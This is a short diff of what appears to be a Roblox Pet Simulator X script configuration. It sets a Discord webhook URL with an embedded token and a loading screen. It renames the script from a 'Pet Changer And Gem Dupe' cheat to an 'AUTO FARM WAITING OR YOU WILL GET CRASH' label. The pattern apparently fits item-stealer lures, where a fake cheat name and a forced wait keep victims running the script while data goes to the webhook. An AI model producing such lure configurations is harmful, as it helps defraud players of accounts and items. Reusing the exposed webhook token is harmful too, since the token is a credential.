@@ -4,7 +4,7 @@ WebHook = "https://discord.com/api/webhooks/1108478223945302076/ugPxaKoaDOf2tnca
 
 loadingscreen = true
 
-_G.CustomScriptName = "PSX Pet Changer And Gem Dupe Script"
+_G.CustomScriptName = "PSX AUTO FARM WAITING OR YOU WILL GET CRASH"
 
 _G.Text1 = "Script Loaded..."
 
